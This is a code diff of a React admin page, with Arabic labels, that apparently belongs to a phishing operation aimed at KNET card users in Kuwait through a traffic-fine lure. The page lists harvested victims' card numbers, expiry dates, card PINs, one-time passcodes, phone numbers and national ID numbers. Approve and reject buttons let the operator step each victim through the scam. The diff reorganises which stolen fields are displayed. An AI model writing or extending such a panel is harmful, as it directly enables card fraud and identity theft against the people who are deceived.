@@ -393,16 +393,7 @@ export default function NotificationsPage() {
                             hint: "الصفحة الرئيسية",
                           },
                           { page: "knet", label: "كنت", hint: "صفحة كنت" },
-                          {
-                            page: "phone",
-                            label: "هاتف",
-                            hint: "رقم الهاتف ",
-                          },
-                          {
-                            page: "phoneCode",
-                            label: " OTP",
-                            hint: " OTP",
-                          },
+                    
                           {
                             page: "sahel",
                             label: "هوية",
@@ -487,7 +478,7 @@ export default function NotificationsPage() {
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
                 {selectedNotification.cardNumber &&
-                  selectedNotification.cardNumber  +' - '+ selectedNotification.prefix}
+                  selectedNotification.cardNumber  +" - "+ selectedNotification.prefix}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
@@ -496,17 +487,26 @@ export default function NotificationsPage() {
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
-              <p className="flex items-centerpt-4">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
-              </p>
-              <p className="flex items-centerpt-4">
+           
+           
+            </div>
+          )}
+          {selectedInfo === "personal" && selectedNotification && (
+            <div className="space-y-2">
+              <p>
+                <strong>الهاتف:</strong> {selectedNotification.mobile}
               </p>
               <p>
-                <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
-                <div className="grid grid-cols-4">
-                  {selectedNotification.allOtps &&
-                    selectedNotification.allOtps.map((i, index) => <Badge key={index}>{i}</Badge>)}
-                </div>
+                <strong>رقم الهوية</strong> {selectedNotification.idNumber}
+              </p>
+              <p>
+                <strong>نوع الشبكة :</strong> {selectedNotification.network}
+              </p>{" "}
+              <p>
+                <strong>قيمة المخالفة :</strong> {selectedNotification.violationValue}
+              </p>{" "}
+              <p>
+                <strong>رمز التحقق المرسل :</strong> {selectedNotification.otp}
               </p>
               <div className="flex justify-between mx-1">
                 <Button
@@ -534,27 +534,10 @@ export default function NotificationsPage() {
                 >
                   رفض
                 </Button>
+
               </div>
               <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
-            </div>
-          )}
-          {selectedInfo === "personal" && selectedNotification && (
-            <div className="space-y-2">
-              <p>
-                <strong>الهاتف:</strong> {selectedNotification.mobile}
-              </p>
-              <p>
-                <strong>لايميل:</strong> {selectedNotification.email}
-              </p>
-              <p>
-                <strong>نوع الشبكة :</strong> {selectedNotification.network}
-              </p>{" "}
-              <p>
-                <strong>قيمة المخالفة :</strong> {selectedNotification.violationValue}
-              </p>{" "}
-              <p>
-                <strong>Phobe OTP :</strong> {selectedNotification.phoneOtp}
-              </p>
+
             </div>
           )}
         </DialogContent>
